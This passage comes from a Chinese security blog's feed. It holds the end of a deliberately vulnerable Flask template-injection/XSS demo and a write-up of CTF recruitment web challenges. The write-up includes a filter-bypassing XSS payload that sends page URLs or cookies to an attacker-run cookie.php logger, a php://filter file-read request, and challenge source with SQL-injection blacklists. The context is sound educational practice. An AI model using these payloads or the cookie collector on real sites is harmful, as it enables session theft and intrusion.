class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello &#123;&#123;person.name&#125;&#125;!&lt;/h2&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"><span class="comment">##### Private function if the user has local files.###</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello-xss&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_xss</span>():</span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    template = <span class="string">&#x27;hello.unsafe&#x27;</span> <span class="comment"># &#x27;unsafe&#x27; file extension... totally legit.</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(template, name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello-hi&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_hi</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;title&gt;No Injection Allowed!&lt;/title&gt; </span></span><br><span class="line"><span class="string">        &lt;a href=&#x27;&#123;&#123; url_for(&#x27;hello_xss&#x27;)&#125;&#125;?name=&#123;&#123; name e&#125;&#125;&#x27;&gt; </span></span><br><span class="line"><span class="string">        Click here for a welcome message&lt;/a&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&quot;world&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_file</span>(<span class="params">f_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.jinja_env.globals[&#x27;get_user_file&#x27;] = get_user_file # Allows for use in Jinja2 templates</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>转义函数对于html的属性没卵用,链接作为一个整体,如果不加引号封装的话就会导致用户用onmouseover一类payload触发xss <img src="/images/2017/11/flask8.png" alt="blacsheep" /> 利用引号封装可以解决这个问题 <img src="/images/2017/11/flask9.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cnss招新wp(pentest)</title>
      <link href="/2017/10/22/cnss%E6%8B%9B%E6%96%B0wppentest/"/>
      <url>/2017/10/22/cnss%E6%8B%9B%E6%96%B0wppentest/</url>
      
        <content type="html"><![CDATA[<p>写wp的晚上平台挂了,随意的写一写</p><h3 id="入门">1.入门</h3><p><a href="http://game.mitah.cn/beginning/">传送门</a> tip:简直就是在送 右键  源码  复制  粘贴  提交</p><h3 id="are_you_european">2.Are_you_European</h3><p><a href="http://game.mitah.cn/Are_you_European/">传送门</a> 我是解的js混淆做的,页面下面有混淆的js,用下面这个脚本解混淆</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">a = <span class="number">62</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/[\r\n]+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&quot;\\&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> tmp = code.<span class="title function_">match</span>(<span class="regexp">/\b(\w+)\b/g</span>);</span><br><span class="line">    tmp.<span class="title function_">sort</span>();</span><br><span class="line">    <span class="keyword">var</span> dict = [];</span><br><span class="line">    <span class="keyword">var</span> i, t = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tmp.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp[i] != t) dict.<span class="title function_">push</span>(t = tmp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> len = dict.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">var</span> ch;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        ch = <span class="title function_">num</span>(i);</span><br><span class="line">        code = code.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span> + dict[i] + <span class="string">&#x27;\\b&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), ch);</span><br><span class="line">        <span class="keyword">if</span> (ch == dict[i]) dict[i] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span> = <span class="string">&quot;eval(function(p,a,c,k,e,d)</span></span><br><span class="line"><span class="string">&#123;e=function(c)</span></span><br><span class="line"><span class="string">&#123;return(c&lt;a?&#x27;&#x27;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;</span></span><br><span class="line"><span class="string">if(!&#x27;&#x27;.replace(/^/,String))</span></span><br><span class="line"><span class="string">&#123;while(c--)d[e(c)]=k[c]e(c)</span></span><br><span class="line"><span class="string">;k=[function(e)&#123;return d[e]&#125;];</span></span><br><span class="line"><span class="string">e=function()&#123;return&#x27;\\\\w+&#x27;&#125;;c=1&#125;;</span></span><br><span class="line"><span class="string">while(c--)</span></span><br><span class="line"><span class="string">if(k[c])</span></span><br><span class="line"><span class="string">p=p.replace(new RegExp(&#x27;\\\\b&#x27;+e(c)+&#x27;\\\\b&#x27;,&#x27;g&#x27;),k[c]);</span></span><br><span class="line"><span class="string">return p</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">(&quot;</span> + <span class="string">&quot;&#x27;&quot;</span> + code + <span class="string">&quot;&#x27;,&quot;</span> + a + <span class="string">&quot;,&quot;</span> + len + <span class="string">&quot;,&#x27;&quot;</span> + dict.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;&#x27;.split(&#x27;&#x27;),0,&#123;&#125;))&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">num</span>(<span class="params">c</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> (c&lt;a?<span class="string">&#x27;&#x27;</span>:<span class="title function_">num</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>): c.<span class="title function_">toString</span>(<span class="number">36</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    code = code.<span class="title function_">replace</span>(<span class="regexp">/^eval/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;code&#x27;</span>).<span class="property">value</span> = <span class="built_in">eval</span>(code);</span><br><span class="line">&#125; &lt; /script&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;textarea id=&quot;code&quot; cols=&quot;80&quot; rows=&quot;20&quot;&gt; </span><br><span class="line"></span><br><span class="line">&lt;/textarea &gt; </span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Encode&quot; / &gt;</span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Run&quot; / &gt;</span><br><span class="line">&lt;input type = &quot;button&quot;value = &quot;Decode&quot; / &gt;</span><br></pre></td></tr></table></figure><p>把前面这段保存成html文件,本地打开把混淆扔进去decode一下然后去<a href="http://tool.oschina.net/codeformat/js">格式化一下</a>然后看一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">soHappy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buy = <span class="title function_">confirm</span>(<span class="string">&quot;SSR！欧洲人，你愿意献祭你全部的 SSR 来获取 flag 吗？&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$(<span class="string">&quot;#serv5&quot;</span>).<span class="title function_">html</span>() &amp;&amp; !$(<span class="string">&quot;#craft5&quot;</span>).<span class="title function_">html</span>()) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;你根本不是欧洲人。&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;c&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;T&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;3&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;e&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;N&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (buy) &#123;</span><br><span class="line">        $(<span class="string">&quot;#serv5&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">        $(<span class="string">&quot;#craft5&quot;</span>).<span class="title function_">remove</span>();</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;兑换成功。flag: &quot;</span> + flag)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;你失去了唯一的机会，明年再来吧。&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这就很简单了chrome,F12 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;c&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;T&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;3&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;e&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;N&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;_&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;n&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    flag += <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2017/10/1.png" /> 然后啊...有个大佬说,他把times给改了....然后单抽出奇迹....可以可以厉害厉害666... <img src="/images/2017/10/11.png" /></p><h3 id="ctf选手没有视力">3.CTF选手没有视力</h3><p>这个题没有地址了,因为平台已经关掉了,我也进不去了,这道题好像是某室内部成员找到后台的一个解释漏洞(不清楚能不能算,毕竟是后台嘛...),然后把输入框搞没了,然后只要恢复一下就ok,但flag是在源码里面,反正不难</p><h3 id="最简单的">4.最简单的</h3><p>emmmmm记得不太清,但似乎是关于请求的一个题,地址找了半天 <a href="http://jiejie.cyru1s.com/futa/">传送门</a> <img src="/images/2017/10/2.png" /> 用的firefox的hackbar,python发请求或者burp抓包也可以</p><h3 id="比入门难一点">5.比入门难一点</h3><p>访问index.php <img src="/images/2017/10/3.png" /> flag在背景中</p><h3 id="不太记得">6.7不太记得</h3><p>有一个是雪梨姐姐和钱姐姐的比赛,然后改cookie过(似乎是前面的某个还是后面...不记得了),反正不是很难....</p><h3 id="noway">8.noway</h3><p>这道题我记得,这个是wechall上面的题,查看.htaccess文件 <img src="/images/2017/10/4.png" /> 没有ban掉to,move,直接burp抓个包过,考点是http的请求方式,详情看下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">通过请求URI得到资源</span><br><span class="line">POST,</span><br><span class="line">用于添加新的内容</span><br><span class="line">PUT</span><br><span class="line">用于修改某个内容</span><br><span class="line">DELETE,</span><br><span class="line">删除某个内容</span><br><span class="line">CONNECT,</span><br><span class="line">用于代理进行传输，如使用SSL</span><br><span class="line">OPTIONS</span><br><span class="line">询问可以执行哪些方法</span><br><span class="line">PATCH,</span><br><span class="line">部分文档更改</span><br><span class="line">PROPFIND, (wedav)</span><br><span class="line">查看属性</span><br><span class="line">PROPPATCH, (wedav)</span><br><span class="line">设置属性</span><br><span class="line">MKCOL, (wedav)</span><br><span class="line">创建集合（文件夹）</span><br><span class="line">COPY, (wedav)</span><br><span class="line">拷贝</span><br><span class="line">MOVE, (wedav)</span><br><span class="line">移动</span><br><span class="line">LOCK, (wedav)</span><br><span class="line">加锁</span><br><span class="line">UNLOCK (wedav)</span><br><span class="line">解锁</span><br><span class="line">TRACE</span><br><span class="line">用于远程诊断服务器</span><br><span class="line">HEAD</span><br><span class="line">类似于GET, 但是不返回body信息，用于检查对象是否存在，以及得到对象的元数据</span><br></pre></td></tr></table></figure><p>apache2中，可使用Limit，LimitExcept进行访问控制的方法包括：GET, POST, PUT, DELETE, CONNECT,OPTIONS, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, 和 UNLOCK. 其中 HEAD GET POST OPTIONS PROPFIND是和读取相关的方法， MKCOL PUT DELETE LOCK UNLOCK COPY MOVE PROPPATCH是和修改相关的方法 这里还有一点就是php会将TO方法给解析成GET方法。那么我们就可以抓包，改为TO来请求index.php <img src="/images/2017/10/5.png" /> <img src="/images/2017/10/6.png" /></p><h3 id="charming-boy">9.Charming Boy</h3><p><a href="http://game.mitah.cn/charming_boy/index.php">传送门</a> 这道题就是个xss,写个python跑个md5,顺便发个payload过去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    m2=hashlib.md5()</span><br><span class="line">    m2.update(src.encode())</span><br><span class="line">    <span class="keyword">return</span> m2.hexdigest()</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&quot;http://game.mitah.cn/charming_boy/index.php&quot;</span>)</span><br><span class="line">start=r.text.find(<span class="string">&quot;substr(md5($code),0,4) = &quot;</span>)</span><br><span class="line">start+=<span class="built_in">len</span>(<span class="string">&#x27;substr(md5($code),0,4) = &#x27;</span>)</span><br><span class="line">code=r.text[start:start+<span class="number">4</span>]</span><br><span class="line">ok=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(md5(<span class="built_in">str</span>(each))[:<span class="number">4</span>])==<span class="built_in">str</span>(code):</span><br><span class="line">        ok=<span class="built_in">str</span>(each)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&#x27;message&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;Script&gt;document.write</span></span><br><span class="line"><span class="string">(&quot;&lt;iframe width=0 height=0</span></span><br><span class="line"><span class="string">src=&#x27;http://localhost/cookie.php?xss=&quot;+</span></span><br><span class="line"><span class="string">document.locatioonn.href</span></span><br><span class="line"><span class="string">+&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/iframe&gt;&quot;);&lt;/Script&gt;&#x27;&#x27;&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:ok&#125;</span><br><span class="line"></span><br><span class="line">r=u.post(<span class="string">&#x27;http://game.mitah.cn/charming_boy/post.php&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>这里对script过滤了,第一次我检查的时候把script改成了scrscriptipt然后过了alert,但是似乎过iframe的时候挂了...发的信息就是让目标进入站点的时候请求我们的目标地址来加载iframe,然后就用get的参数发送了cookie(或地址)到我们的服务器上,然后这里代码写的是地址,要改成cookie的话把上面的xss="+ document.locatioonn.href(location里面的on被过滤了,用oonn绕过)改成xss="+document.cookie 服务器上面的cookie.php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str1</span>=<span class="variable">$_GET</span>[<span class="string">&quot;xss&quot;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$str1</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>然后发现请求的地址 http://game.mitah.cn/charming_boy/H3r3_1s_tH3_f1a9.php 带上cookie <img src="/images/2017/10/7.png" /> 得到空页面,看下源码,找到flag <img src="/images/2017/10/8.png" /></p><h3 id="charming-girls">10.Charming Girls</h3><p><a href="http://mitah.cn:20000/charming_girls/">传送门</a> 随便看下,然后扫了个目录,发现index.php,login.php什么的 然后有fun后面有相应参数,我们用php伪协议请求下文件 发现index不能请求到,然后其他的页面都没什么用,但是因为show页面有图,猜测存在数据库里面, 请求一下 http://mitah.cn:20000/charming_girls/?fun=php://filter/read=convert.base64-encode/resource=show&amp;id=1 然后得到一串base64,解一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;connect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(andorunionselectupdatedeleteinsertfromwherelimitsleep</span></span><br><span class="line"><span class="string">countconcatrandfloorsubstrasciicharmidorder</span></span><br><span class="line"><span class="string">version\(\)database\(\)user\(\)\#\-\-\&#x27;\&quot;</span></span><br><span class="line"><span class="string">\=\*\&amp;\\`)/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(and.*\=.*or.*\=.*\&amp;\&amp;.*\=.*\\.*\=.*</span></span><br><span class="line"><span class="string">union selectselect.*from.*where</span></span><br><span class="line"><span class="string">limit .*,.*sleep(.*)if(.*)</span></span><br><span class="line"><span class="string">order by [0-9]*left(.*,.*)</span></span><br><span class="line"><span class="string">\`)/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/( \=)/i&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Bad request!&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from pgg where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;table style=<span class="string">&quot;width:700px;height:300px;&quot;</span>&gt;</span><br><span class="line">  